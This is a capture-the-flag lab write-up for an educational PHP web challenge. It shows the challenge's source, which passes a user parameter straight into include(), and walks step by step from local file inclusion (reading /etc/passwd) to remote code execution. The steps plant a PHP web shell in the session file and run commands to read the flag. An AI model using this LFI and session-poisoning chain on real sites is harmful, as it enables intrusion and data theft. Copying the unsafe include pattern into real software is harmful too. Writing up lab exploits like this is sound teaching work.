# Simple Web 0x01(Lab - Hello from Windows 98)
###### tags: `CTF` `Web` `eductf`
Challenge: https://windows.ctf.zoolab.org/

Very similar to [0x07(Lab - `HakkaMD`)](/nGAjlvyURtOcRBW1XfCfOA)

## Source code
:::spoiler code
```php!=
 <?php
  session_start();
  if(isset($_GET['source'])){
    highlight_file('./'.$_GET['source'].'.php');
    die();
  }
  if(isset($_GET['name']) && $_GET['name']!=''){
    $_SESSION['name'] = $_GET['name'];
    header("Location: /?page=hi.php");
    die();
  }
  if(!isset($_GET['page'])){
    header("Location: /?page=say.php");
    die();
  }
?>
<!DOCTYPE html>
<html>
<head>
  <title>Hello from Windows 98</title>
  <meta charset="UTF-8" />
  <link rel="stylesheet" href="https://unpkg.com/98.css" />
</head>
<style>
    body{
        background: url('blue.png');
        background-size: cover;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
    }
</style>
</style>
<body>
  <div class="window" style="margin: 32px; width: 500px">
    <div class="title-bar">
      <div class="title-bar-text">
        Hello World..
      </div>
      <div class="title-bar-controls">
        <button aria-label="Minimize"></button>
        <button aria-label="Maximize"></button>
        <button aria-label="Close"></button>
      </div>
    </div>
    <div class="window-body">
      <?php include($_GET['page']);?>
    </div>
  </div>
</body>
</html>

```
:::

## Exploit - LFI to RCE
1. First things first, the website has `LFI` problem
`https://windows.ctf.zoolab.org/?page=/etc/passwd`
![](https://i.imgur.com/2BHfWtQ.png)

2. <font color="FF0000">**通靈**</font>
It didn't provide any information about system, so we can assume the setting is default at first.

3. `webshell`
`<?php system($_GET['sh']); ?>`
↓
We use `LFI` to read session file:
`https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829`
![](https://i.imgur.com/gAnKZGF.png)
It execute system function successfully.
↓
`https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829&sh=ls%20/var/www/html`
↓
![](https://i.imgur.com/JOOmyyl.png)
↓
`https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829&sh=cat%20/var/www/html/flag.txt`
4. Then we got flag!!!